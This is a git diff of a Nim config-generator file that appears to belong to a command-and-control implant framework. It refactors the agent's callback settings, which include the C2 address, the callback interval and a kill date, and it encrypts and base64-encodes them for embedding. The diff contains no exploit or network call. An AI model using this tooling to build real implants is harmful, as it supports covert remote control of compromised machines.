@@ -7,37 +7,10 @@ import times
 import std/strutils
 import std/json
 import os
+import configjs
+import types
 
 let URL_MAX_LEN = 256
-
-#this is used to store the encrypted bytes
-type
-  EncConfig* = ref object
-    privKey*: Key
-    pubKey*: Key
-    encObj: EncMsg
-
-type
-  StaticConfig* = ref object
-    buildid: Oid      #generated on build
-    deploymentid: Oid #generated on deployment
-    killEpoch*: int32  #what point should the agent stop calling back and delete
-    interval*: int32   #how often should the agent call back
-    callback*: string  #where the C2 is 
-
-
-proc serEncConfig*(encMsg:EncConfig): string = 
-  result = toFlatty(encMsg)
-
-proc desEncConfig*(serEncMsg:string): EncConfig = 
-  result = serEncMsg.fromFlatty(EncConfig)
-
-proc serConfig*(encMsg:StaticConfig): string = 
-  result = toFlatty(encMsg)
-
-proc desConfig*(serEncMsg:string): StaticConfig = 
-  result = serEncMsg.fromFlatty(StaticConfig)
-
 
 proc writeStringToFile(fileName: string, contents: string) =
   let f = open(filename, fmWrite)
@@ -51,8 +24,9 @@ proc readStringFromFile(fileName: string): string =
 
 proc createEmptyConfig(): StaticConfig =
   var config = StaticConfig()
-  config.buildid = genOid()
-  config.deploymentid = genOid()
+  config.buildid = $(genOid())
+  config.deploymentid = "\0".repeat(URL_MAX_LEN)
+  echo config.buildid," size:",config.buildid.len
   config.killEpoch = 0
   config.interval = 0
   config.callback = "\0".repeat(URL_MAX_LEN)
@@ -71,13 +45,6 @@ proc readEncConfig*(encConfig:EncConfig): StaticConfig =
   let config = desConfig(toString(configBytes))
   result = config
 
-proc padUrl*(url:string): string =
-  let urlLen = url.len
-  if urlLen < URL_MAX_LEN:
-    result = url & "\0".repeat(URL_MAX_LEN-urlLen)
-  else:
-    raise (newException(ValueError, "URL is too long"))
-    result = url
 
 proc genOutFile(configIn:string,configOut:string)= 
   let configJSONStr = readStringFromFile(configIn)
@@ -91,7 +58,6 @@ proc genOutFile(configIn:string,configOut:string)=
   let encConfig = createEncConfig(newConfig)
   let b64Str = b64Str(toFlatty(encConfig))
   writeStringToFile(configOut, b64Str)
-
 
 when isMainModule:
   import parseOpt
